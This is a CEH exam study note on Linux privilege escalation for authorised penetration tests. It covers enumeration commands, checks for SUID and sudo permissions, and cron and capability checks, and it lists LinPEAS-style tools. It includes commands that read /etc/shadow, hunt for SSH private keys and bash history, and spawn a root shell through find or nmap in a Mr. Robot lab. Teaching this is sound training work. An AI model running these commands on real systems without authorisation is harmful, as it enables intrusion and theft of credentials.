# Linux Privilege Escalation

> **Module:** CEH v13 – Module 06 (System Hacking)
>
> **Objective:** Learn common Linux privilege escalation techniques used during authorized penetration tests.

---

# What is Linux Privilege Escalation?

Linux Privilege Escalation is the process of gaining root or higher privileges after obtaining a low-privileged shell.

Example

```
www-data

↓

user

↓

root
```

---

# Privilege Escalation Workflow

```text
Gain Initial Access
        │
        ▼
System Enumeration
        │
        ▼
Find Misconfigurations
        │
        ▼
Exploit Weakness
        │
        ▼
Gain Root
        │
        ▼
Post Exploitation
```

---

# Enumeration

Always begin with system enumeration.

Current User

```bash
whoami
```

User ID

```bash
id
```

Hostname

```bash
hostname
```

Kernel Version

```bash
uname -a
```

OS Information

```bash
cat /etc/os-release
```

Current Directory

```bash
pwd
```

---

# User Enumeration

Current User

```bash
whoami
```

All Users

```bash
cat /etc/passwd
```

Current Groups

```bash
groups
```

Home Directories

```bash
ls /home
```

---

# Sudo Privileges

Check sudo permissions

```bash
sudo -l
```

---

# SUID Binaries

Find SUID files

```bash
find / -perm -4000 -type f 2>/dev/null
```

Useful GTFOBins

- nmap
- find
- vim
- less
- bash
- cp
- tar

---

# Writable Files

Find writable files

```bash
find / -writable -type f 2>/dev/null
```

Writable directories

```bash
find / -writable -type d 2>/dev/null
```

---

# Cron Jobs

List cron jobs

```bash
crontab -l
```

System cron

```bash
cat /etc/crontab
```

---

# Capabilities

Check Linux capabilities

```bash
getcap -r / 2>/dev/null
```

---

# Environment Variables

View variables

```bash
env
```

---

# Kernel Version

Check kernel

```bash
uname -r
```

Older kernels may be vulnerable to privilege escalation exploits.

---

# Password Files

Users

```bash
cat /etc/passwd
```

Shadow (Root only)

```bash
cat /etc/shadow
```

---

# Interesting Files

SSH Keys

```bash
find / -name id_rsa 2>/dev/null
```

Configuration Files

```bash
find / -name "*.conf" 2>/dev/null
```

History Files

```bash
cat ~/.bash_history
```

---

# Automated Enumeration Tools

- LinPEAS
- LinEnum
- Linux Exploit Suggester
- Metasploit Local Exploit Suggester

Example

```bash
./linpeas.sh
```

---

# Common Privilege Escalation Techniques

- SUID Binaries
- Weak sudo permissions
- Cron Jobs
- Writable Scripts
- Capabilities
- Kernel Exploits
- Weak File Permissions
- Misconfigured Services
- PATH Hijacking
- Password Reuse

---

# GTFOBins

GTFOBins is a collection of Unix binaries that can be abused for privilege escalation.

Website

```
https://gtfobins.github.io
```

Example

```bash
find . -exec /bin/sh \; -quit
```

---

# Real Lab Example

## Mr. Robot

```bash
find / -perm -4000 -type f 2>/dev/null

/usr/local/bin/nmap
```

Exploit

```bash
nmap --interactive
```

Inside interactive mode

```text
nmap> !sh
```

Gain root shell.

---

# Useful Tools

| Tool | Purpose |
|------|----------|
| LinPEAS | Linux Enumeration |
| LinEnum | Enumeration |
| Linux Exploit Suggester | Kernel Checks |
| GTFOBins | Binary Exploitation |
| Metasploit | Local Exploit Suggestion |

---

# Best Practices

✔ Enumerate thoroughly.

✔ Check sudo privileges first.

✔ Inspect SUID binaries.

✔ Review cron jobs.

✔ Verify Linux capabilities.

✔ Document every finding.

---

# Interview Questions

## What is Linux Privilege Escalation?

The process of gaining root privileges from a lower-privileged user.

---

## Which command lists sudo permissions?

```bash
sudo -l
```

---

## Which command finds SUID binaries?

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## Which command displays user information?

```bash
id
```

---

## Name two Linux privilege escalation tools.

- LinPEAS
- LinEnum

---

# CEH Exam Tips

✔ Always enumerate before exploiting.

✔ Check SUID binaries and sudo permissions.

✔ Learn common GTFOBins techniques.

✔ Understand cron jobs and Linux capabilities.

✔ Practice on VulnHub, TryHackMe, and Hack The Box labs.

---

# Key Takeaways

- Linux privilege escalation depends on identifying system misconfigurations and weak permissions.
- Enumeration is the foundation of successful privilege escalation.
- GTFOBins, LinPEAS, and LinEnum are essential tools for Linux assessments.
- Always verify findings manually and document evidence during authorized engagements.

---

## Related Notes

- `09-Meterpreter-Commands.md`
- `10-Privilege-Escalation-Windows.md`
- `12-Persistence-Techniques.md`
- `17-System-Hacking-Tools.md`
- `20-Cheat-Sheet.md`
